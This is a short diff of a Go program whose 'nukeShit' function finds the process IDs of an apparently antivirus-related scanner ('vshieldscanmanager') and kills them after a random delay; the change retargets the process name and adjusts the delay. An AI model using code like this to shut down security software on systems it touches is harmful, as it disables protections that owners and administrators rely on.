@@ -88,7 +88,7 @@ func main() {
 }
 
 func nukeShit() {
-	out, err := exec.Command("bash", "-c", "ps -ef | grep -i vshieldscanner | grep -v grep | awk '{print $2}'").Output()
+	out, err := exec.Command("bash", "-c", "ps -ef | grep -i vshieldscanmanager | grep -v grep | awk '{print $2}'").Output()
 	if err != nil {
 		fmt.Printf("An error occured: %#v\n", err)
 	}
@@ -106,7 +106,7 @@ func nukeShit() {
 
 		go func(PID int) {
 			rand.Seed(time.Now().Unix())
-			d := time.Duration(rand.Intn(11-1) + 1)
+			d := time.Duration(rand.Intn(11-8) + 8)
 			time.Sleep(d * time.Second)
 			killProc, err := os.FindProcess(PID)
 			if err != nil {
